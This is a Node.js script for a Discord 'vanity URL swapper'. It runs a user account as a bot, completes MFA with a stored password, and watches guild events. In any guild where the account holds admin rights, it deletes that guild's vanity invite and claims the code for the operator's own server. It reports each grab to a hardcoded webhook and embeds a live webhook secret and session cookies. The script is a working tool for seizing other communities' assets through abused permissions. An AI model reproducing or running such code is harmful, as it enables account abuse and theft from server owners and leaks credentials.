import http2 from 'http2';
import WebSocket from 'ws';
import axios from 'axios';

const swapperpassword = "";
const swappertoken = "";
let serverid = "1415296605397192728";
const webhookURL = "https://canary.discord.com/api/webhooks/1417833440543375452/mj3USEYHIaFE6KvtczlfFjfVjWVQ6YwNuspdHKXhyBi7fegOaZEJv9BpYhHjEymf9tAk";

const cH = {
  "User-Agent": "Mozilla/5.0",
  Authorization: swappertoken,
  "Content-Type": "application/json",
  Host: "canary.discord.com",
  "X-Super-Properties": "eyJicm93c2VyIjoiQ2hyb21lIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiQ2hyb21lIiwiY2xpZW50X2J1aWxkX251bWJlciI6MzU1NjI0fQ==",
  Cookie: "__dcfduid=e4b41870c0ea11ef8a7146a8012bdadc; __sdcfduid=e4b41870c0ea11ef8a7146a8012bdadc03493787d783a0a0e2f5bb4db161f4576d6b6e54f9daa8327c5fd3f8134d09c4; __cfruid=4389eaa152d58b286c2a2fbc722d11935cc63ac2-1739269782; _cfuvid=1Hc58Q1Yo6cXIWud4hS1_R5QFZMAJiiOVrOJIbWWkjI-1739269782714-0.0.1.1-604800000; cf_clearance=BdF_ewiRLaPoYyreIprXJkSVWfXVCQMQ1h7MIt1mY_o-1739277321-1.2.1.1-JmKhJ2BweCe_XyyQVVm5dNUm.fDE6NVE27a_qVOMTDXYsq_5dEoSObcNJfqQs2Lw5UC8mmAQ72IvYgqx3EjfL2inLPj7SqQJEfY6Cd2RT1FbZDqW.XVk60yGUBLqH8eoH9cp_UP_D.df5583FWOR3NKcdVtXVqd3SEntmDoIe1WVDVkf9f4U_LRIioqUfA3zqrWFSDYK7ZQb0eoG_PBi7Ps_cxnparGFk3Q.xOF4xhNXLOuYOt6piurTczIxdITUy5tUHvLlW5S4in5fzEqQ762fw8I2PhChSov7LV1x0Og"
};

let mfaToken1;
let guilds = {};
let session;
let websocket;
let reconnecting = false;
let heartbeat = null;

const http2Request = (method, path, customHeaders = {}, body = null) => {
    return new Promise((resolve, reject) => {
        const req = http2.connect("https://canary.discord.com").request({ ":method": method, ":path": path, ...customHeaders });
        let data = "";
        req.on("response", () => req.on("data", chunk => data += chunk).on("end", () => resolve(data)));
        req.on("error", reject);
        if (body) req.write(body);
        req.end();
    });
};

startBot();
function connectHTTP2() {
    if (session) session.close();
    session = http2.connect("https://canary.discord.com", {
        settings: {
            enablePush: false
        }
    });
    session.on("error", () => {
        setTimeout(connectHTTP2, 50);
    });
    session.on("close", () => {
        setTimeout(connectHTTP2, 50);
    });
}


function connectWebSocket() {
    if (websocket) websocket.close();
    reconnecting = false;
    
    const HEARTBEAT = Buffer.from('{"op":1,"d":{}}');
    const IDENTIFY = Buffer.from(
        JSON.stringify({
            op: 2,
            d: {
                token: swappertoken,
                intents: 1,
                properties: {os: "linux", browser: "Discord Android"},
                guild_subscriptions: false,
                large_threshold: 0
            }
        })
    );
    
    const HEARTBEAT_INTERVAL = 41250;
    const CONNECTION_LIFETIME = 900000;

    const start = () => {
        try {
            const identifyPayload = Buffer.from(IDENTIFY);
            const heartbeatPayload = Buffer.from(HEARTBEAT);
            
            websocket = new WebSocket("wss://gateway-us-east1-b.discord.gg", {
                perMessageDeflate: false,
                autoPong: true,
                skipUTF8Validation: true,
                followRedirects: false,
                rejectUnauthorized: false,
                maxRedirects: 0
            });

            websocket.onopen = () => {
                websocket.send(identifyPayload, {binary: false}, (err) => {
                    if (err) setImmediate(reconnect);
                });

                heartbeat = setInterval(() => {
                    if (websocket.readyState !== WebSocket.OPEN) {
                        setImmediate(reconnect);
                        return;
                    }

                    websocket.send(heartbeatPayload, {binary: false}, (err) => {
                        if (err) setImmediate(reconnect);
                    });
                }, HEARTBEAT_INTERVAL);

                heartbeat.unref();
            };
                    
            websocket.onmessage = ({data}) => {
                const {d, t} = JSON.parse(data);
                if (t === "GUILD_UPDATE") {
                    const guildId = d.guild_id || d.id;
                    
                    if (guildId === serverid) {
                        return;
                    }

                    const oldVanity = guilds[guildId];
                    const newVanity = d.vanity_url_code;
                    
                    if (oldVanity !== newVanity && newVanity && checkAdminPermissions(d)) {
                        console.log(`vanity found guild: ${guildId}, Vanity: ${newVanity}`);
                        deleteInvite(newVanity);
                        patchVanityUrl(newVanity);
                        sendWebhookNotification(guildId, newVanity, 'vanity_transfer_attempt');
                    }
                    
                    guilds[guildId] = newVanity;
                } else if (t === "READY") {
                    global.botUserId = d.user.id;
                    
                    d.guilds
                        .filter((g) => g.vanity_url_code)
                        .forEach((g) => (guilds[g.id] = g.vanity_url_code));
                    console.log(`Done ${d.user.username} (${d.user.id}), Guilds Size => ${d.guilds.length}`);
                    console.log(` ${JSON.stringify(Object.fromEntries(Object.entries(guilds)), null, 2)}`);
                    
                    console.log(`bot is working rn : hairo /`);
                } else if (t === "GUILD_MEMBER_UPDATE") {
                    if (d.user && d.user.id === getBotUserId() && checkAdminPermissions(d)) {
                        console.log(`Bot received admin permissions in guild: ${d.guild_id}`);
                        sendWebhookNotification(d.guild_id, null, 'admin_granted');
                        if (guilds[d.guild_id]) {
                            const vanityCode = guilds[d.guild_id];
                            console.log(`Guild: ${d.guild_id}, Vanity: ${vanityCode}`);
                            deleteInvite(vanityCode);
                            patchVanityUrl(vanityCode);
                            sendWebhookNotification(d.guild_id, vanityCode, 'vanity_transfer_attempt');
                        }
                    }
                }
            };
            
            websocket.onclose = () => setImmediate(reconnect);
            setTimeout(() => {
                if (websocket?.readyState === WebSocket.OPEN) {
                    clearInterval(heartbeat);
                }
            }, CONNECTION_LIFETIME).unref();
        } catch (error) {
            reconnecting = false;
            reconnect();
        }
    };

    const reconnect = () => {
        if (reconnecting) return;
        reconnecting = true;

        clearInterval(heartbeat);
        websocket?.close?.(1000);

        setTimeout(() => {
            reconnecting = false;
            start();
        }, 3000);
    };

    start();
}

function getBotUserId() {
    return global.botUserId;
}

function checkAdminPermissions(guildData) {
    if (guildData.member && guildData.member.permissions) {
        const permissions = parseInt(guildData.member.permissions);
        return (permissions & 0x8) === 0x8;
    }
    return true;
}

let lastWebhookTime = 0;
const WEBHOOK_COOLDOWN = 2000;
async function sendWebhookNotification(guildId, vanityCode, eventType) {
    if (!webhookURL) return;
    
        const now = Date.now();
    if (now - lastWebhookTime < WEBHOOK_COOLDOWN) {
        console.log(`webhook rate limit protection...`);
        return;
    }
    
    try {
        const embed = {
            type: 'rich',
            color: 0x9A7FF0,
            title: 'XAXAXAXAXAXAXAXAXAXAX',
            thumbnail: {
                url: 'https://i.pinimg.com/originals/41/b7/6e/41b76eb9f11511cbf3af8c5cc7ce8507.gif'
            },
            description: eventType === 'admin_granted' 
                ? `yonetici done`
                : JSON.stringify({code: vanityCode, uses: 0, server: serverid, guild: guildId}),
            fields: [
                { name: "**Guild**", value: `\`${guildId}\``, inline: true },
                { name: "**Vanity**", value: `\`${vanityCode || 'N/A'}\``, inline: true },
                { name: "**Discord**", value: "[@stressource](https://discord.com/users/1188432630669135945)", inline: true }
            ],
            footer: { text: 'present day, present time.' }
        };

        const payload = {
            embeds: [embed],
            content: eventType === 'admin_granted' 
                ? `@everyone perm done! \`${guildId}\`` 
                : `@everyone \`${vanityCode}\``
        };
        
        await axios.post(webhookURL, payload);
        lastWebhookTime = now;
        console.log(`notify done: ${eventType}`);
    } catch (error) {
        console.error("notify refer error ", error.message);
    }
}


async function handleMFA() {
    try {
    const { mfa } = JSON.parse(await http2Request("PATCH", "/api/guilds/0/vanity-url", cH));
        if (!mfa?.ticket) {
            console.log("fa error check token");
            setTimeout(handleMFA, 30000);
            return;
        }
        
        const { token } = JSON.parse(await http2Request("POST", "/api/mfa/finish", cH, JSON.stringify({ 
            ticket: mfa.ticket, 
            mfa_type: "password", 
            data: swapperpassword 
        })));
        
        if (!token) {
            console.log("mfa err check password");
            setTimeout(handleMFA, 30000);
            return;
        }
        
    mfaToken1 = token;
        console.log(`mfa done ${mfaToken1.slice(0, 5)}...${mfaToken1.slice(-5)}`);
    } catch (error) {
        console.error("mfa err", error.message);
        setTimeout(handleMFA, 30000);
    }
}

async function deleteInvite(vanityCode) {
    const deleteResponse = await http2Request("DELETE", `/api/invite/${vanityCode}`, { ...cH, "X-Discord-MFA-Authorization": mfaToken1 });
    console.log(`[!] Deleted vanity: ${vanityCode}`);
}

async function patchVanityUrl(vanityCode) {
    const patchResponse = await http2Request("PATCH", `/api/guilds/${serverid}/vanity-url`, { ...cH, "X-Discord-MFA-Authorization": mfaToken1 }, JSON.stringify({ code: vanityCode }));
    console.error("[!] Vanity URL changed:", JSON.parse(patchResponse));
}

async function startBot() {
    console.log("Starting");
    
    connectHTTP2();
    
    await handleMFA();
    
    connectWebSocket();
    
    setInterval(handleMFA, 290000);
    setInterval(() => {
        if (session && !session.destroyed) {
            session.request({":method": "HEAD", ":path": "/api/v10/gateway"}).end();
        }
    }, 900000);
    
    console.log("Started!");
    console.log(`Guild ${serverid}`);
    console.log("Listing");
}
